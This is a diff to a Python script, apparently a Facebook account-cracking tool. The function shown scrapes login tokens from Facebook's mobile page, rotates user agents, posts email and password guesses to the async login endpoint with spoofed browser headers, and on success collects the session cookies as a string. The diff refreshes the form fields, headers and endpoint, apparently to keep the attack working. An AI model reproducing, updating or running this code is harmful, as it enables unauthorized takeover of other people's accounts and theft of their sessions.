@@ -1228,34 +1228,24 @@ def m6(idf,pwv):
    session = requests.Session()
    KING=random.choice(ugen) 
    free_fb = session.get('https://m.facebook.com').text
-   info= {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number":"0", "unrecognized_tries":"0", "email":idf, "pass":ps, "login":"Log In"}
+   info= {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
    had={
-   'Host': f'mbasic.facebook.com',
-   'content-length': '1662',
-   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
-   'sec-ch-ua-mobile': '?1',
-   'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-   'x-response-format': 'JSONStream',
-   'content-type': 'application/x-www-form-urlencoded',
-   'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   'viewport-width': '360',
-   'sec-ch-ua-platform-version': "",
-   'x-requested-with': 'XMLHttpRequest',
-   'x-asbd-id': '129477',
-   'dpr': '2',
-   'sec-ch-ua-full-version-list': '',
-   'sec-ch-ua-model': "",
-   'sec-ch-prefers-color-scheme': 'light',
-   'sec-ch-ua-platform': '"Windows"',
-   'accept': '*/*',
-   'origin': f'https://mbasic.facebook.com',
-   'sec-fetch-site': 'same-origin',
-   'sec-fetch-mode': 'cors',
-   'sec-fetch-dest': 'empty',
-   'referer': f'https://mbasic.facebook.com/login/?wtsid=rdr_0HpBBBchEc4DCrXrX&refsrc=deprecated&_rdr',
-   'accept-encoding': 'gzip, deflate, br',
-   'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-   lo = session.post("https://mbasic.alpha.facebook.com/login/device-based/login/async/?",data=info,headers=had).text
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Cache-Control': 'max-age=0',
+    'Referer': 'https://m.facebook.com/',
+    'DNT': '1',
+    'Pragma': 'no-cache',
+    'TE': 'Trailers', }
+   lo = session.post("https://m.facebook.com/login/device-based/login/async/?",data=info,headers=had).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
